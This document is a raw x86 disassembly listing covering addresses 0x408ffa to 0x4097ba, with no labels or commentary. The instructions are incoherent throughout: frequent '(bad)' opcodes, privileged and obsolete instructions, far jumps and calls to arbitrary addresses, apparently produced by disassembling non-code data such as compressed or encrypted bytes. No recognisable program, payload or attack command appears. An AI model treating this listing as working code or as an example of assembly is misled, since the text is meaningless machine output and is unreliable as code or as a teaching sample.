  408ffa:	repnz test eax,0x8b00c8fb
  409000:	dec    ebx
  409001:	(bad)  
  409002:	fisttp DWORD PTR [edi+0x3a]
  409005:	lds    edi,FWORD PTR [esi-0x37]
  409008:	and    al,0xa0
  40900a:	xchg   esi,eax
  40900b:	adc    dl,BYTE PTR [eax]
  40900d:	add    esi,ebx
  40900f:	ficomp WORD PTR [eax+0x2c]
  409012:	jl     0x40907f
  409014:	pop    edx
  409015:	mov    BYTE PTR fs:[eiz*4+0x51717b13],dl
  40901d:	push   0x2ee80f95
  409022:	(bad)  
  409023:	call   0x6af906ed
  409028:	jb     0x408fb6
  40902a:	addr16 out 0x5b,al
  40902d:	fsubr  st,st(0)
  40902f:	shr    ah,1
  409031:	cmc    
  409032:	add    eax,0x7d3010b4
  409037:	adc    al,0xbb
  409039:	into   
  40903a:	repnz bnd jmp 0x409012
  40903e:	push   ss
  40903f:	icebp  
  409040:	cmp    BYTE PTR [edx-0x29],dh
  409043:	retf   
  409044:	push   edx
  409045:	in     al,dx
  409046:	sbb    dh,BYTE PTR [ebx+0x72]
  409049:	and    BYTE PTR [edx*8-0xdde6b55],ah
  409050:	or     eax,0xb035c989
  409055:	das    
  409056:	add    eax,0x3d9c4bab
  40905b:	(bad)  
  40905c:	jg     0x408fe5
  40905e:	jmp    0x409036
  409060:	cmc    
  409061:	mov    dh,BYTE PTR [edx+0x3a882ded]
  409067:	adc    al,0xa2
  409069:	popa   
  40906a:	jne    0x40908d
  40906c:	and    esi,eax
  40906e:	jp     0x40903a
  409070:	sbb    al,0xbb
  409072:	out    dx,al
  409073:	pop    ds
  409074:	push   0xa0a4dde9
  409079:	add    al,0x34
  40907b:	jle    0x409044
  40907d:	adc    esi,DWORD PTR [edx-0xb0ce691]
  409083:	rcr    edi,1
  409085:	aas    
  409086:	out    0xb2,al
  409088:	pushf  
  409089:	push   ss
  40908a:	adc    DWORD PTR [edx*1-0x4fe8cb60],ebp
  409091:	add    esp,DWORD PTR [edi]
  409093:	in     eax,dx
  409094:	mov    es,WORD PTR [edi-0x282623e0]
  40909a:	inc    esp
  40909b:	xor    eax,0x4efa2cda
  4090a0:	mov    ebx,0x7c7988af
  4090a5:	xchg   edx,eax
  4090a6:	add    edi,DWORD PTR [eax-0xb]
  4090a9:	icebp  
  4090aa:	sahf   
  4090ab:	gs in  eax,dx
  4090ad:	xchg   ecx,eax
  4090ae:	ror    BYTE PTR [edi],cl
  4090b0:	aas    
  4090b1:	pop    edx
  4090b2:	adc    ch,al
  4090b4:	sbb    DWORD PTR [ebx+ebp*4-0x38cdcbce],edi
  4090bb:	mov    bh,BYTE PTR [eax]
  4090bd:	push   ecx
  4090be:	ins    DWORD PTR es:[edi],dx
  4090bf:	pop    es
  4090c0:	xlat   BYTE PTR ds:[ebx]
  4090c1:	das    
  4090c2:	or     bh,cl
  4090c4:	xchg   ecx,eax
  4090c5:	sbb    eax,0x95f9d8df
  4090ca:	gs stos BYTE PTR es:[edi],al
  4090cc:	retf   0xea
  4090cf:	sar    DWORD PTR [ebx],0xc1
  4090d2:	or     BYTE PTR [ebx-0x637d365c],0x53
  4090d9:	lahf   
  4090da:	retf   
  4090db:	and    DWORD PTR [edi-0x4dca14ed],ebx
  4090e1:	mov    bh,0xd1
  4090e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090e4:	mov    BYTE PTR [esi+0x3],ah
  4090e7:	jecxz  0x40912a
  4090e9:	inc    edi
  4090ea:	sahf   
  4090eb:	push   cs
  4090ec:	adc    BYTE PTR [ecx+0x49],0xce
  4090f0:	mov    ebx,0x8357c6ef
  4090f5:	and    cl,BYTE PTR [ecx]
  4090f7:	vorpd  ymm3,ymm3,YMMWORD PTR [ebx+eax*2]
  4090fc:	pop    esi
  4090fd:	mov    ds:0x243584c8,al
  409102:	popa   
  409103:	mov    edi,ebx
  409105:	or     eax,0x9c445343
  40910a:	xor    dh,0xef
  40910d:	fidivr WORD PTR [ebp-0x58]
  409110:	inc    esi
  409111:	dec    esp
  409112:	mov    edx,0xbbab75e2
  409117:	jnp    0x4090ff
  409119:	jns    0x40918f
  40911b:	cmp    cl,BYTE PTR [esi]
  40911d:	jbe    0x4090d2
  40911f:	push   ds
  409120:	inc    ecx
  409121:	pop    esp
  409122:	dec    edx
  409123:	fisubr WORD PTR [ecx-0x15062dad]
  409129:	nop    DWORD PTR [ebx+eax*8]
  40912d:	mov    cl,0xea
  40912f:	test   eax,0x5d66ad0f
  409134:	fisubr WORD PTR [ebx-0x26a733ae]
  40913a:	sbb    BYTE PTR [esi-0x4b],ch
  40913d:	inc    ebx
  40913e:	push   DWORD PTR [ecx]
  409140:	shr    edi,1
  409142:	xchg   esi,eax
  409143:	pop    esi
  409144:	ret    0x7f71
  409147:	shl    DWORD PTR [ebp+0x5d847bd0],1
  40914d:	call   0x41ba04c6
  409152:	sub    dl,BYTE PTR [si+0x7f]
  409156:	cdq    
  409157:	jecxz  0x409183
  409159:	pop    esp
  40915a:	outs   dx,BYTE PTR ds:[esi]
  40915b:	xor    edi,DWORD PTR [edi+ebp*8+0x57abcaa0]
  409162:	repnz jecxz 0x409112
  409165:	pushf  
  409166:	sbb    ebx,edi
  409168:	xchg   edx,eax
  409169:	or     BYTE PTR [ebx-0x65a61a1b],al
  40916f:	mov    esp,0xedea318c
  409174:	test   DWORD PTR ds:0xeaa97e83,esi
  40917a:	sbb    DWORD PTR [esi+ecx*8-0x24d045e4],ebx
  409181:	mov    ecx,0x61742705
  409186:	std    
  409187:	inc    ecx
  409188:	stc    
  409189:	cmp    esp,edi
  40918b:	push   ss
  40918c:	adc    esp,ecx
  40918e:	mov    gs,edi
  409190:	pop    esp
  409191:	enter  0xfde5,0xfa
  409195:	pop    ebx
  409196:	in     al,0x9
  409198:	inc    edi
  409199:	mov    esi,0xa61354a2
  40919e:	pusha  
  40919f:	cdq    
  4091a0:	hlt    
  4091a1:	arpl   WORD PTR [esi+eax*1-0x63],cx
  4091a5:	test   eax,0xca4c3bde
  4091aa:	daa    
  4091ab:	jbe    0x409148
  4091ad:	out    dx,al
  4091ae:	mov    ecx,0x9d24a869
  4091b3:	jns    0x409213
  4091b5:	loop   0x4091a4
  4091b7:	jmp    0xed64:0xc58b26eb
  4091be:	or     al,0xb1
  4091c0:	mov    al,0x90
  4091c2:	xchg   edx,eax
  4091c3:	lods   al,BYTE PTR ds:[esi]
  4091c4:	mov    bl,0xe
  4091c6:	test   BYTE PTR [ebx-0x4144a74e],cl
  4091cc:	jp     0x4091ab
  4091ce:	pop    es
  4091cf:	sbb    BYTE PTR [edi],dl
  4091d1:	xor    BYTE PTR [ecx+edi*8-0x27],dl
  4091d5:	fdiv   QWORD PTR ds:[eax]
  4091d8:	rcl    DWORD PTR [edi+0x17],cl
  4091db:	inc    esp
  4091dc:	and    BYTE PTR [ebp-0x5239d18],0x6d
  4091e3:	sub    ch,bh
  4091e5:	mov    eax,ds:0x233daef5
  4091ea:	jge    0x40923b
  4091ec:	push   0x359788c8
  4091f1:	mov    ds:0x41bf7a37,eax
  4091f6:	push   es
  4091f7:	cmc    
  4091f8:	dec    eax
  4091f9:	push   eax
  4091fa:	inc    ecx
  4091fb:	je     0x4091ba
  4091fd:	sub    ch,BYTE PTR [ecx+eax*4+0x1dec2a8a]
  409204:	push   esp
  409205:	or     al,0x16
  409207:	daa    
  409208:	mov    DWORD PTR [edi+0x6d],ebx
  40920b:	add    al,0x50
  40920d:	es push esp
  40920f:	push   ds
  409210:	jns    0x40922f
  409212:	fwait
  409213:	(bad)  
  409214:	fldcw  WORD PTR [ecx]
  409216:	adc    BYTE PTR [ebx+0x1f],0x44
  40921a:	mov    al,0x93
  40921c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40921d:	mov    WORD PTR [ecx-0x4726cbdb],?
  409223:	jmp    0x40922e
  409225:	pop    ebp
  409226:	out    dx,al
  409227:	nop
  409228:	xor    DWORD PTR [edx],ebp
  40922a:	jmp    0x409207
  40922c:	jo     0x4092a7
  40922e:	addr16 push esp
  409230:	out    0x90,eax
  409232:	mov    esi,0x199a0746
  409237:	popf   
  409238:	add    bl,al
  40923a:	pushf  
  40923b:	or     BYTE PTR [edi-0x126088a0],dh
  409241:	mov    bh,0x4e
  409243:	mov    ecx,0x83422c
  409248:	inc    ecx
  409249:	mov    edx,0x32da92d0
  40924e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40924f:	mov    esi,0x26d50bc3
  409254:	add    BYTE PTR [ecx+ebx*8-0x5bf076e4],0x1e
  40925c:	mov    bh,0xef
  40925e:	(bad)  
  40925f:	out    dx,eax
  409260:	mov    al,ds:0xeffabd1a
  409265:	jle    0x409255
  409267:	rol    DWORD PTR [ecx-0x6c],1
  40926a:	dec    ebp
  40926b:	adc    al,0xdb
  40926d:	and    DWORD PTR [ecx+0x3f54c03e],edi
  409273:	pop    ecx
  409274:	mov    ebx,0xf6ec73d4
  409279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40927a:	mov    ch,0xe5
  40927c:	cli    
  40927d:	mov    esi,0xf1744eb6
  409282:	ins    BYTE PTR es:[edi],dx
  409283:	push   esi
  409284:	cmc    
  409285:	add    al,0xe
  409287:	xlat   BYTE PTR ds:[ebx]
  409288:	cmp    DWORD PTR [edx+0x52],eax
  40928b:	add    al,0xa5
  40928d:	gs jo  0x4092d5
  409290:	add    ecx,ecx
  409292:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409293:	sub    al,BYTE PTR [edi+0x1bcdb786]
  409299:	rcr    DWORD PTR [ecx],cl
  40929b:	add    al,0x33
  40929d:	push   esi
  40929e:	mov    ebp,0x489578f8
  4092a3:	mov    esi,0xf8967c95
  4092a8:	mov    ecx,0x3b763bfc
  4092ad:	xchg   ecx,eax
  4092ae:	fidiv  DWORD PTR [ebp+0x2e]
  4092b1:	out    0xc6,al
  4092b3:	aam    0x40
  4092b5:	repnz mov ebx,0xb5091186
  4092bb:	gs ins BYTE PTR es:[edi],dx
  4092bd:	aaa    
  4092be:	aaa    
  4092bf:	(bad)  
  4092c0:	repz cwde 
  4092c2:	(bad)  
  4092c3:	xor    eax,0xbd6f30fd
  4092c8:	jp     0x409256
  4092ca:	xchg   DWORD PTR ds:0x15a6e339,edi
  4092d0:	inc    ecx
  4092d1:	mov    dh,0x20
  4092d3:	sbb    al,0xa4
  4092d5:	ss pop ds
  4092d7:	push   0x9c24a01e
  4092dc:	outs   dx,DWORD PTR ds:[esi]
  4092dd:	jge    0x409286
  4092df:	push   ss
  4092e0:	xor    BYTE PTR [edx],0xf2
  4092e3:	test   al,0xaf
  4092e5:	loop   0x409277
  4092e7:	inc    ecx
  4092e8:	and    DWORD PTR [eax+0x4b],0xffffffc2
  4092ec:	xchg   BYTE PTR [edi],al
  4092ee:	push   ecx
  4092ef:	aam    0x9c
  4092f1:	and    DWORD PTR [ecx],esp
  4092f3:	(bad)  
  4092f4:	loope  0x4092cb
  4092f6:	inc    eax
  4092f7:	mov    edx,0xcbcbe753
  4092fc:	push   edx
  4092fd:	pusha  
  4092fe:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  409300:	mov    al,0x88
  409302:	and    BYTE PTR [eax],ah
  409304:	add    al,BYTE PTR [edi+0x5e]
  409307:	call   0x79ba:0xcab9242a
  40930e:	or     eax,0x7ae8c304
  409313:	shr    BYTE PTR [esi-0xd517ae8],1
  409319:	mov    esi,0xc9d8deb7
  40931e:	inc    edx
  40931f:	sbb    DWORD PTR [ebp+0x31],edi
  409322:	push   ds
  409323:	xor    al,0x75
  409325:	xor    eax,0x23563fd9
  40932a:	cmp    eax,0x88729116
  40932f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409331:	adc    al,0x8c
  409333:	pushf  
  409334:	gs push esi
  409336:	xor    DWORD PTR [ebx+edi*2],esi
  409339:	fsubrp st(2),st
  40933b:	sbb    eax,DWORD PTR [edi]
  40933d:	pop    esp
  40933e:	nop
  40933f:	loopne 0x4093a5
  409341:	repz and ah,cl
  409344:	daa    
  409345:	popa   
  409346:	(bad)  
  409347:	cmp    ch,BYTE PTR [esi+0x70]
  40934a:	push   ecx
  40934b:	loope  0x409399
  40934d:	mov    dl,0xb2
  40934f:	xchg   ebp,eax
  409350:	into   
  409351:	in     eax,dx
  409352:	mov    BYTE PTR [ebp+0x33],al
  409355:	jno    0x4093ae
  409357:	dec    bl
  409359:	jmp    0x1eeda71e
  40935e:	pusha  
  40935f:	(bad)  
  409360:	repnz stos DWORD PTR es:[edi],eax
  409362:	aaa    
  409363:	arpl   WORD PTR [ebx-0x13],cx
  409366:	pop    ss
  409367:	nop
  409368:	push   edx
  409369:	push   0xf2772e1b
  40936e:	aas    
  40936f:	jne    0x4093a3
  409371:	pop    ebx
  409372:	pop    ebx
  409373:	lahf   
  409374:	mov    bh,BYTE PTR [esi-0x3b]
  409377:	imul   esp,esp,0xfffffff9
  40937a:	or     dh,BYTE PTR [ebx-0x7dfa6001]
  409380:	fadd   QWORD PTR [edi]
  409382:	dec    ecx
  409383:	mov    eax,ebp
  409385:	lahf   
  409386:	(bad)  
  409387:	jmp    0x4093c5
  409389:	mov    ch,0xe5
  40938b:	sub    eax,0x5aaf82a4
  409390:	jo     0x4093da
  409392:	test   DWORD PTR [ecx-0x55],ebx
  409395:	pushf  
  409396:	dec    edi
  409397:	xchg   esi,eax
  409398:	arpl   cx,bx
  40939a:	inc    edx
  40939b:	xchg   BYTE PTR [eax],al
  40939d:	pop    edi
  40939e:	sbb    esp,eax
  4093a0:	push   eax
  4093a1:	and    ebx,esp
  4093a3:	push   ecx
  4093a4:	mov    al,0xd0
  4093a6:	call   0x8ea9f2a5
  4093ab:	sbb    eax,DWORD PTR [esi-0x41ce8ec7]
  4093b1:	mov    ch,0x8d
  4093b3:	adc    eax,0x444bddc3
  4093b8:	arpl   WORD PTR [ecx+ecx*1],ax
  4093bb:	mov    eax,0x3228572c
  4093c0:	pop    ebx
  4093c1:	xchg   DWORD PTR [ecx],edi
  4093c3:	jp     0x4093ee
  4093c5:	stos   DWORD PTR es:[edi],eax
  4093c6:	xchg   ebp,eax
  4093c7:	dec    ebx
  4093c8:	xor    eax,DWORD PTR [ecx]
  4093ca:	sub    BYTE PTR [ecx-0x64],0xd1
  4093ce:	shl    BYTE PTR [edx-0x14],1
  4093d1:	sbb    cl,BYTE PTR [eax+0x187e839c]
  4093d7:	outs   dx,BYTE PTR ds:[esi]
  4093d8:	and    ecx,DWORD PTR [esi]
  4093da:	mov    al,ds:0x5305d2c6
  4093df:	pop    ebp
  4093e0:	dec    edx
  4093e1:	adc    al,0x3e
  4093e3:	lods   al,BYTE PTR ds:[esi]
  4093e4:	inc    ebx
  4093e5:	push   0x3f
  4093e7:	mov    esi,0x4135bd1a
  4093ec:	ja     0x409396
  4093ee:	das    
  4093ef:	dec    eax
  4093f0:	stc    
  4093f1:	ja     0x4093b7
  4093f3:	in     al,dx
  4093f4:	loop   0x40943e
  4093f6:	lods   al,BYTE PTR ds:[esi]
  4093f7:	out    0x1d,eax
  4093f9:	xchg   ebp,eax
  4093fa:	jmp    0x95ed:0x4a59c050
  409401:	and    ecx,DWORD PTR [ebp+0x2397db8d]
  409407:	into   
  409408:	shr    DWORD PTR [ebp+0x14bd4b02],cl
  40940e:	xor    eax,0x699e5007
  409413:	stc    
  409414:	add    edx,DWORD PTR [edi-0x78]
  409417:	out    0x95,eax
  409419:	inc    ebp
  40941a:	mov    ecx,0xe45c18fd
  40941f:	lods   eax,DWORD PTR ds:[esi]
  409420:	call   0x2bb5:0x5e2aa005
  409427:	clc    
  409428:	xchg   sp,ax
  40942a:	inc    eax
  40942b:	fstp   DWORD PTR [ecx-0x27]
  40942e:	hlt    
  40942f:	mov    edi,0x62f9f5c5
  409434:	in     eax,0xa2
  409436:	push   ds
  409437:	in     eax,0xa9
  409439:	cmp    ebp,DWORD PTR [edi+0x65]
  40943c:	lahf   
  40943d:	mov    edx,0xa8695417
  409442:	call   0x3562:0xb753e3c5
  409449:	test   BYTE PTR gs:[esp+eax*2+0x612aee5b],ah
  409451:	pop    ds
  409452:	mov    dl,0x82
  409454:	adc    BYTE PTR [ebp-0x12313200],dh
  40945a:	pop    ss
  40945b:	mov    DWORD PTR [ebp+0x513c125f],ecx
  409461:	(bad)  
  409462:	in     eax,dx
  409463:	jge    0x409403
  409465:	dec    esi
  409466:	add    eax,ebx
  409468:	cmp    bl,bh
  40946a:	adc    cl,al
  40946c:	pop    edx
  40946d:	icebp  
  40946e:	clc    
  40946f:	pop    edx
  409470:	dec    edx
  409471:	and    BYTE PTR [edx+0x57],dl
  409474:	add    al,0xd5
  409476:	lods   eax,DWORD PTR ds:[esi]
  409477:	push   ebp
  409478:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409479:	and    BYTE PTR [esi-0x1d],bh
  40947c:	pop    ebp
  40947d:	inc    esp
  40947e:	jecxz  0x409489
  409480:	mov    ch,0x27
  409482:	scas   eax,DWORD PTR es:[edi]
  409483:	sbb    al,0x51
  409485:	push   0xebcf6bd9
  40948a:	das    
  40948b:	push   eax
  40948c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40948d:	arpl   WORD PTR [eax+0x5],ax
  409490:	add    esp,DWORD PTR [eax+0x6b]
  409493:	inc    ecx
  409494:	mov    eax,0x92e8fd0d
  409499:	daa    
  40949a:	pop    eax
  40949b:	push   ss
  40949c:	iret   
  40949d:	addr16 dec ecx
  40949f:	icebp  
  4094a0:	retf   
  4094a1:	(bad)  
  4094a2:	mov    ecx,0xc9a4c97f
  4094a7:	adc    bl,BYTE PTR [edi+0x6ed2108f]
  4094ad:	rcr    esp,1
  4094af:	jecxz  0x4094da
  4094b1:	outs   dx,BYTE PTR ds:[esi]
  4094b2:	xchg   esi,eax
  4094b3:	inc    ecx
  4094b4:	pop    edi
  4094b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094b6:	stos   BYTE PTR es:[edi],al
  4094b7:	mov    al,0x6a
  4094b9:	enter  0x343f,0xe
  4094bd:	and    DWORD PTR [edi-0x9bb6a4f],0xffffff9f
  4094c4:	fcomp  st(4)
  4094c6:	cmp    dh,BYTE PTR [ebx]
  4094c8:	xor    eax,0xc1297c03
  4094cd:	pop    ebp
  4094ce:	xchg   edx,eax
  4094cf:	jmp    0xf752e0c9
  4094d4:	jne    0x40950e
  4094d6:	ds mov edx,0x24a5b02
  4094dc:	test   al,0x83
  4094de:	pop    ebx
  4094df:	mov    ds:0x29056b82,eax
  4094e4:	ret    0x42c6
  4094e7:	iret   
  4094e8:	sub    BYTE PTR [esi-0x5],al
  4094eb:	dec    esp
  4094ec:	xchg   ecx,eax
  4094ed:	sti    
  4094ee:	aam    0x8b
  4094f0:	aad    0x5e
  4094f2:	add    DWORD PTR [ebx],edx
  4094f4:	rsm    
  4094f6:	pushf  
  4094f7:	pop    ds
  4094f8:	lds    edi,FWORD PTR [ebx]
  4094fa:	add    al,0x47
  4094fc:	mov    ds:0xcc047ae0,eax
  409501:	dec    edx
  409502:	push   ss
  409503:	and    eax,0xba94a232
  409508:	cmc    
  409509:	and    ebx,DWORD PTR [ecx]
  40950b:	push   ebx
  40950c:	fdivr  st,st(0)
  40950e:	cmp    eax,0x26592a80
  409513:	or     eax,0xcb839938
  409518:	inc    edx
  409519:	sub    ecx,edi
  40951b:	mov    ebx,0x12068039
  409520:	out    0xb6,eax
  409522:	cmp    al,0x35
  409524:	xor    ah,BYTE PTR [eax-0x500be64b]
  40952a:	hlt    
  40952b:	sbb    DWORD PTR [eax+0x6d],0xfffffffc
  40952f:	cli    
  409530:	int3   
  409531:	fild   QWORD PTR [edi]
  409533:	xchg   ebx,eax
  409534:	aas    
  409535:	inc    ebp
  409536:	clc    
  409537:	div    ecx
  409539:	in     eax,0x87
  40953b:	loope  0x409566
  40953d:	bound  ebx,QWORD PTR [edi]
  40953f:	test   DWORD PTR ds:0xe0113e69,eax
  409545:	and    edx,DWORD PTR [eax-0xf]
  409548:	scas   eax,DWORD PTR es:[edi]
  409549:	lock dec edx
  40954b:	es loopne 0x4095b6
  40954e:	jge    0x409518
  409550:	jg     0x40957c
  409552:	cmp    ch,0x2d
  409555:	gs jne 0x409576
  409558:	pop    ebp
  409559:	repz in eax,dx
  40955b:	lods   eax,DWORD PTR ds:[esi]
  40955c:	cmp    eax,0xa4dee23
  409561:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409562:	pop    ss
  409563:	sbb    esp,0x68
  409566:	and    ch,BYTE PTR [edi-0x44e55f7c]
  40956c:	sbb    eax,0xaadb2e7a
  409571:	(bad)  
  409572:	mov    dl,0xcd
  409574:	test   eax,0x69317942
  409579:	int    0x3a
  40957b:	push   edi
  40957c:	and    eax,0x426da3d5
  409581:	sub    al,0x76
  409583:	cs mov edx,0x51aa8e11
  409589:	jbe    0x409602
  40958b:	add    ebp,DWORD PTR ds:0xbdf8e7e8
  409591:	ins    BYTE PTR es:[edi],dx
  409592:	in     al,dx
  409593:	xor    cl,BYTE PTR [edx+0x2b]
  409596:	inc    ebp
  409597:	mov    al,ds:0x984bae46
  40959c:	mov    dh,0x75
  40959e:	jp     0x40954d
  4095a0:	inc    ebx
  4095a1:	loope  0x409575
  4095a3:	frstor [esi-0x17]
  4095a6:	lahf   
  4095a7:	jp     0x4095c9
  4095a9:	push   edx
  4095aa:	lods   eax,DWORD PTR ds:[esi]
  4095ab:	ror    DWORD PTR [edi],0x80
  4095ae:	test   ecx,ebp
  4095b0:	xchg   edx,eax
  4095b1:	lds    ebx,FWORD PTR [ecx+0x4c]
  4095b4:	in     eax,0xc0
  4095b6:	dec    DWORD PTR ds:0x13f95eb9
  4095bc:	test   eax,0xbff69480
  4095c1:	sbb    al,0x2e
  4095c3:	inc    esi
  4095c4:	hlt    
  4095c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095c6:	into   
  4095c7:	out    dx,al
  4095c8:	xchg   edx,eax
  4095c9:	daa    
  4095ca:	jg     0x409647
  4095cc:	hlt    
  4095cd:	jg     0x4095d4
  4095cf:	mov    dh,0x3c
  4095d1:	call   0x9c94:0xb888ce9b
  4095d8:	les    eax,FWORD PTR [eax]
  4095da:	xchg   ecx,eax
  4095db:	push   esi
  4095dc:	cwde   
  4095dd:	fwait
  4095de:	xchg   BYTE PTR [edx+0x47],dl
  4095e1:	outs   dx,BYTE PTR ds:[esi]
  4095e2:	(bad)  
  4095e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095e4:	imul   ebp,DWORD PTR [eax],0x1f
  4095e7:	mov    ebx,0x99708538
  4095ec:	stos   DWORD PTR es:[edi],eax
  4095ed:	sub    ebp,DWORD PTR [edx]
  4095ef:	loope  0x4095f8
  4095f1:	and    ch,BYTE PTR [ebx+0x4dd3e255]
  4095f7:	ret    
  4095f8:	jne    0x4095e8
  4095fa:	push   ebx
  4095fb:	xor    dh,al
  4095fd:	rol    BYTE PTR [ecx],cl
  4095ff:	ror    BYTE PTR [ebx-0x5c6e0dcf],cl
  409605:	xchg   esi,eax
  409606:	scas   al,BYTE PTR es:[edi]
  409607:	dec    ecx
  409608:	sub    al,0x28
  40960a:	jnp    0x4095c5
  40960c:	and    eax,0x49e8b89f
  409611:	jmp    0x575:0xc6ed2390
  409618:	int    0xe8
  40961a:	jne    0x4095be
  40961c:	inc    edx
  40961d:	call   0x98f3:0x2fed12a6
  409624:	stc    
  409625:	mov    cl,0x2c
  409627:	jnp    0x4095e9
  409629:	gs out 0x3a,eax
  40962c:	xor    esp,DWORD PTR [ebx-0x3b]
  40962f:	sbb    DWORD PTR [edx+edx*1],esp
  409632:	idiv   DWORD PTR [ebp-0x38]
  409635:	cmp    bh,dh
  409637:	shl    ch,cl
  409639:	ret    0x4e92
  40963c:	inc    edi
  40963d:	retf   0x8728
  409640:	hlt    
  409641:	sbb    eax,0x805e4778
  409646:	repnz (bad) 
  409648:	call   0x2704a4cd
  40964d:	loopne 0x40969a
  40964f:	stc    
  409650:	jge    0x40965d
  409652:	mov    ah,0xb6
  409654:	jle    0x4096cc
  409656:	xor    al,0x0
  409658:	ret    
  409659:	mov    ch,0x36
  40965b:	adc    al,0x96
  40965d:	mov    esp,0x79d6a7
  409662:	xor    al,0xd1
  409664:	cli    
  409665:	test   DWORD PTR [edx],edi
  409667:	popa   
  409668:	and    dh,BYTE PTR [ecx+edi*1-0x32]
  40966c:	test   eax,0x8ee51388
  409671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409672:	xchg   ecx,eax
  409673:	jbe    0x409685
  409675:	push   ebx
  409676:	bound  edx,QWORD PTR [ecx]
  409678:	add    ebx,0xffffffce
  40967b:	shr    dh,1
  40967d:	(bad)  
  40967f:	addr16 and ecx,edx
  409682:	mov    eax,0xe2317e6c
  409687:	aas    
  409688:	mov    eax,ds:0x6d44476b
  40968d:	out    dx,al
  40968e:	inc    edx
  40968f:	test   al,0x66
  409691:	jmp    0x7553dcf
  409696:	jle    0x4096cb
  409698:	leave  
  409699:	push   eax
  40969a:	lock pop ds
  40969c:	fsub   DWORD PTR ds:0xaf178cda
  4096a2:	cdq    
  4096a3:	mov    bl,0x67
  4096a5:	enter  0xba5d,0xd8
  4096a9:	call   0x3fdcb244
  4096ae:	in     al,0xf9
  4096b0:	stos   DWORD PTR es:[edi],eax
  4096b1:	jp     0x409668
  4096b3:	out    dx,eax
  4096b4:	and    DWORD PTR [esi+0x7c916fa],ebp
  4096ba:	into   
  4096bb:	not    ebx
  4096bd:	jmp    0x359d4dc
  4096c2:	and    BYTE PTR [eax+0x5b],dl
  4096c5:	iret   
  4096c6:	jmp    0x25c7bf85
  4096cb:	or     dl,cl
  4096cd:	cmp    BYTE PTR [edi+ebx*1],bh
  4096d0:	push   cs
  4096d1:	jl     0x40974a
  4096d3:	jns    0x409686
  4096d5:	imul   ebp,DWORD PTR [edx+0x7d],0x72
  4096d9:	rol    bh,cl
  4096db:	xor    DWORD PTR [ebx+0x298646ab],eax
  4096e1:	jae    0x40967e
  4096e3:	ins    DWORD PTR es:[edi],dx
  4096e4:	cmp    DWORD PTR [edi+0x55],ecx
  4096e7:	xchg   edi,eax
  4096e8:	ror    eax,1
  4096ea:	aaa    
  4096eb:	pop    ebx
  4096ec:	xor    cl,BYTE PTR [ebx-0x73ba0ffa]
  4096f2:	dec    ebx
  4096f3:	add    ah,BYTE PTR [ebx-0x507ed0a4]
  4096f9:	pop    esi
  4096fa:	xlat   BYTE PTR ds:[ebx]
  4096fb:	and    BYTE PTR ds:0xde63a646,ch
  409701:	or     edi,DWORD PTR [ebp+0x22]
  409704:	imul   esp,DWORD PTR [esi-0x4c],0x5
  409708:	xor    bh,BYTE PTR [edx+0x5f]
  40970b:	loopne 0x409708
  40970d:	inc    edx
  40970e:	add    DWORD PTR fs:[edi],eax
  409711:	xor    eax,0x8d3cfe9f
  409716:	sbb    cl,BYTE PTR [eax-0x19]
  409719:	fild   WORD PTR [eax]
  40971b:	lea    bp,[edi-0xa]
  40971f:	ja     0x409791
  409721:	dec    ebx
  409722:	dec    ebx
  409723:	dec    esi
  409724:	and    DWORD PTR [ecx+0x2],ecx
  409727:	sub    ecx,DWORD PTR [esi]
  409729:	cwde   
  40972a:	jno    0x4096b5
  40972c:	sahf   
  40972d:	xchg   ebx,eax
  40972e:	in     al,0xa2
  409730:	stos   DWORD PTR es:[edi],eax
  409731:	mov    DWORD PTR [ecx-0x7d],edx
  409734:	xchg   esi,eax
  409735:	xchg   esi,eax
  409736:	shl    DWORD PTR [ebx-0x19],1
  409739:	sbb    bh,al
  40973b:	xchg   esp,eax
  40973c:	add    al,0x19
  40973e:	aad    0x3a
  409740:	pop    edi
  409741:	cmp    BYTE PTR [ebp+0x5f],0xaa
  409745:	mov    ds:0x56a57e04,al
  40974a:	xor    al,BYTE PTR [ecx]
  40974c:	mov    al,ds:0xdf564d65
  409751:	out    0x36,eax
  409753:	aad    0xcf
  409755:	shr    dl,1
  409757:	jmp    0x8890ecc4
  40975c:	in     al,0xef
  40975e:	into   
  40975f:	push   0xffffffc3
  409761:	fsub   QWORD PTR [ecx+0x16bef906]
  409767:	das    
  409768:	test   DWORD PTR [ebp-0x22f849d1],eax
  40976e:	imul   ebp,DWORD PTR [esi],0xe4172683
  409774:	in     eax,dx
  409775:	mov    bl,0x2a
  409777:	mov    WORD PTR [ebx+0x307f013b],?
  40977d:	cwde   
  40977e:	sub    DWORD PTR [ecx-0x19c86dcd],ecx
  409784:	push   ds
  409785:	jno    0x409728
  409787:	cmc    
  409788:	adc    dh,BYTE PTR [ebp-0x54d43fab]
  40978e:	jb     0x4097bd
  409790:	or     DWORD PTR [ebp+0x39b4e624],ecx
  409796:	cli    
  409797:	jle    0x4097dc
  409799:	xchg   ebx,eax
  40979a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40979b:	aad    0x96
  40979d:	mov    DWORD PTR [ebp-0x5759a3b3],ecx
  4097a3:	xor    BYTE PTR [esp+eiz*8],ah
  4097a6:	pop    ecx
  4097a7:	jp     0x4097bd
  4097a9:	mov    ebx,0x66d3d8d2
  4097ae:	fwait
  4097af:	mov    dl,0x75
  4097b1:	jbe    0x4097fd
  4097b3:	jecxz  0x409802
  4097b5:	xchg   esi,eax
  4097b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097b8:	leave  
  4097b9:	pop    es
  4097ba:	fcom   QWORD PTR [ebp-0x4403bbd3]
